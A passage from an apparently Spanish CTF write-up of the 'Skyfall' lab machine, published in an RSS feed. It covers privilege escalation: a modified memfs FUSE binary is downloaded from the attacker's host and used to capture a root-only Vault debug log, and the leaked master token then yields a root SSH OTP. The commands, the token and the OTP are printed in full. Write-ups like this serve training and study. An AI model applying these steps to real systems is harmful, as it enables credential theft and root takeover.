+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ wget http://10.10.14.125:8081/memfs .
+</span></span></code></pre></div>
+<p>Le damos permisos de ejecución y probamos a ejecutarla para ver que se ha compilado correctamente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ chmod +x memfs 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>askyy@skyfall:~$ ./memfs 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>usage: main MOUNTPOINT BACKING-PREFIX
+</span></span></code></pre></div>
+<p>Vemos que podemos montar nuestra carpeta actual en <code>test/</code>, ahora solo necesitamos otra sesión de SSH y ver que todo ha salido bien y podemos acceder a <code>debug.log</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ mkdir /tmp/test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>askyy@skyfall:~$ ./memfs /home/askyy /tmp/test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Mounted!
+</span></span></code></pre></div>
+<p>Al hacer la montura e intentar crear otra vez el archivo vemos que no sale bien.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>askyy@skyfall:/tmp/test$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>[&gt;] Checking seal status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>[+] Vault sealed: false
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>askyy@skyfall:/tmp/test$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>total 12
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>drwxrwxr-x  2 askyy askyy 4096 Sep  5 18:54 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>drwxrwxrwt 13 root  root  4096 Sep  5 18:53 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>-rw-------  1 root  root   555 Sep  5 18:54 debug.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>askyy@skyfall:/tmp/test$ cat debug.log 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>cat: debug.log: Permission denied
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>askyy@skyfall:/tmp/test$ 
+</span></span></code></pre></div>
+<p>Después de volverme loco un rato, añadí esta línea en el <code>main.go</code> de <code>memfs</code>, lo montamos otra vez y nos lo mandamos a la máquina víctima.
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<p>Ahora creamos otra vez la montura en una carpeta distinta.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:~$ mkdir /tmp/test3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>askyy@skyfall:~$ ./memfs /tmp/test3/ test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Mounted!
+</span></span></code></pre></div>
+<p>Y ahora sí, vemos que ahora <code>debug.log</code> es del usuario <code>askyy</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>askyy@skyfall:/tmp/test3$ sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[&gt;] Checking seal status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[+] Vault sealed: false
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>askyy@skyfall:/tmp/test3$ ls -la
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>total 8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>drwxrwxrwx  1 askyy askyy    0 Sep  5 18:57 .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>drwxrwxrwt 15 root  root  4096 Sep  5 18:57 ..
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>-rw-------  1 askyy askyy  555 Sep  5 18:57 debug.log
+</span></span></code></pre></div>
+<p>Al leerlo vemos otro token distinto que el que teníamos para <code>vault</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>askyy@skyfall:/tmp/test3$ cat debug.log 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>2024/09/05 18:57:55 Initializing logger...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>2024/09/05 18:57:55 Reading: /etc/vault-unseal.yaml
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>2024/09/05 18:57:55 Master token found in config: hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>2024/09/05 18:57:55 Found Vault node: http://prd23-vault-internal.skyfall.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>2024/09/05 18:57:55 Check interval: 5s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>2024/09/05 18:57:55 Max checks: 5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>2024/09/05 18:57:55 Establishing connection to Vault...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>2024/09/05 18:57:55 Successfully connected to Vault: http://prd23-vault-internal.skyfall.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>2024/09/05 18:57:55 Checking seal status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>2024/09/05 18:57:55 Vault sealed: false
+</span></span></code></pre></div>
+<p>El token es <code>hvs.I0ewVsmaKU1SwVZAKR3T0mmG</code></p>
+<h2 id="generating-otp-for-root">Generating OTP for root</h2>
+<p>Ahora podemos utilizar este token para iniciar sesión con <code>vault</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ <span style="color:#fff;font-weight:bold">export</span> VAULT_ADDR=http://prd23-vault-internal.skyfall.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/skyfall/content]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>└──╼ [★]$ vault login
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Token (will be hidden): 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>Success! You are now authenticated. The token information displayed below
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>again. Future Vault requests will automatically use this token.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00"></span>Key                  Value
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>---                  -----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>token                hvs.I0ewVsmaKU1SwVZAKR3T0mmG
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>token_accessor       bXBeXR3r92WGQ8XgEDx6pIFu
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>token_duration       ∞
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>token_renewable      false
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>token_policies       [&#34;root&#34;]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>identity_policies    []
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>policies             [&#34;root&#34;]
+</span></span></code></pre></div>
+<p>Ahora vemos que la policy es de <code>root</code> no de <code>developer</code></p>
+<p>Podemos comprobar otra vez los roles SSH.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ vault list ssh/roles
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Keys
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>----
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>admin_otp_key_role
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>dev_otp_key_role
+</span></span></code></pre></div>
+<p>Ahora podemos generar un token OTP para acceder por SSH como <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ vault ssh -role admin_otp_key_role root@10.129.230.158                                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>WARNING: No -mode specified. Use -mode to tell Vault which ssh authentication                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>mode to use. In the future, you will need to tell Vault which mode to use.                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>For now, Vault will attempt to guess based on the API response. This guess                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>involves creating a temporary credential, reading its type, and then revoking                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>it. To reduce the number of API calls and surface area, specify -mode                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>directly. This will be removed in Vault 1.1.                                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>Vault could not locate &#34;sshpass&#34;. The OTP code for the session is displayed                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>below. Enter this code in the SSH password prompt. If you install sshpass,                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>Vault can automatically perform this step for you.                                                               
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>OTP for the session is: 8332584b-b160-c8d1-71ad-f07c1a4356a4                                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>flag provided but not defined: -p
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Usage of vault plugin settings:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>  -ca-cert string
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>.....
+</span></span></code></pre></div>
+<p>Ahora iniciamos sesión utilizando el token OTP <code>8332584b-b160-c8d1-71ad-f07c1a4356a4 </code> como contraseña.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ ssh root@10.129.230.158
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>(root@10.129.230.158) Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span><span style="color:#f00"></span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span><span style="color:#f00"></span>This system has been minimized by removing packages and content that are
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>not required on a system that users do not log into.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span><span style="color:#f00"></span>To restore this content, you can run the &#39;unminimize&#39; command.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span><span style="color:#f00"></span>Last login: Wed Mar 27 13:20:05 2024 from 10.10.14.46
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>root@skyfall:~# id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></span></code></pre></div>
+<p>Podemos leer la flag de <code>root</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>root@skyfall:~# cat root.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>7df601471d54e17a...
+</span></span></code></pre></div>
+<p>¡Y ya estaría!</p>
+<p>Happy Hacking! 🚀</p>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
